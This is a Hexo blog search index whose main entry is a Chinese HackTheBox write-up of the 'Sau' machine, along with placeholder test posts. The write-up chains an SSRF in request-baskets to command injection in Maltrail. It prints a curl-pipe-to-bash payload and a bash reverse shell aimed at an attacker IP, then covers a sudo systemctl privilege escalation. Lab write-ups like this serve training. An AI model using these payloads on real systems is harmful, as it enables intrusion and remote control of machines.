<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Sau</title>
    <url>/myblog/2025/03/17/HTB_Sau/</url>
    <content><![CDATA[<h1 id="Sau"><a href="#Sau" class="headerlink" title="Sau"></a>Sau</h1><p>这个Linux机器主要特点在于利用了两种漏洞结合使用，可以通过CVE-2023-27163的SSRF（Server-Site Request Forgery）攻击，然后发现一个Maltrail程序的服务，版本通过浏览器搜索可以发现是存在未验证攻击的，然后实现命令注入，获取反向shell.最后利用sudo提权。</p>
<h2 id="ENumeration-枚举"><a href="#ENumeration-枚举" class="headerlink" title="ENumeration(枚举)"></a>ENumeration(枚举)</h2><p>Nmap</p>
<p><img src="/myblog/dwdw" alt="1"></p>
<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_nmap.png" alt="1"></p>
<p>发现存在tcp端口22和55555，80端口被过滤。</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_http.png" alt="2"></p>
<p>发现存在1.2.1版本的request-baskets，通过浏览器搜索可以发现它的这个版本存在（SSRF) CVE-2023-27163漏洞，可以攻击它的&#x2F;api&#x2F;baskets&#x2F;{name}组件。</p>
<p>通过burpsuite抓包</p>
<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_bp.png" alt="3"></p>
<p>此处我把get请求改成了post，然后添加了请求头{…}，其中forward_url的参数改为…&#x2F;login，proxy_response为true，然后访问xxx，可以发现能够看到login fail的页面，说明&#x2F;login就是登陆页。</p>
<p>继续抓包</p>
<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_bp2.png" alt="4"></p>
<p>username的值设为<code>curl 10.10.16.5:8000/shell.sh|bash</code>,要用两个&#96;&#96;符号框起来，进行url编码。同时本地开启</p>
<p><code>python3 -m http.server 8000 </code> ,<code>nc lvnp 9001</code>,shell.sh是从网上找的基础反弹shell<code>bash -i &gt;&amp; /dev/tcp/10.10.16.5/9001 0&gt;&amp;1</code>，</p>
<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_user.png" alt="5"></p>
<p>可以查看到puma用户的flag在家目录下。</p>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>常规查看sudo -l，即puma用户拥有的权限，是否存在提权可能。</p>
<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_PE01.png" alt="6"></p>
<p>尝试systemctl是否有可能提权</p>
<p><img src="/myblog/Users/kaikai/Parallels/Parallel_public/shots/Sau_PE02.png" alt="7"></p>
<p>成功结束！</p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/myblog/2025/03/20/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>test_02</title>
    <url>/myblog/2025/03/20/test-02/</url>
    <content><![CDATA[<p><img src="/myblog/../images/test01.png"></p>
<p><img src="/myblog/images/test01.png"></p>
<p><img src="/myblog/%5Cimage%5Ctest01.png"></p>
<p><img src="/myblog/../images/test01.png"></p>
]]></content>
  </entry>
  <entry>
    <title>这是一个测试标题</title>
    <url>/myblog/2025/03/20/test/</url>
    <content><![CDATA[<p><img src="/myblog/test.png"></p>
<p><img src="/myblog/img/neko.jpg"></p>
<p><img src="/myblog/img/neko.jpg"></p>
<p><img src="/myblog/images/test01.png"></p>
<p><img src="/myblog/images/test01.png"></p>
]]></content>
  </entry>
</search>
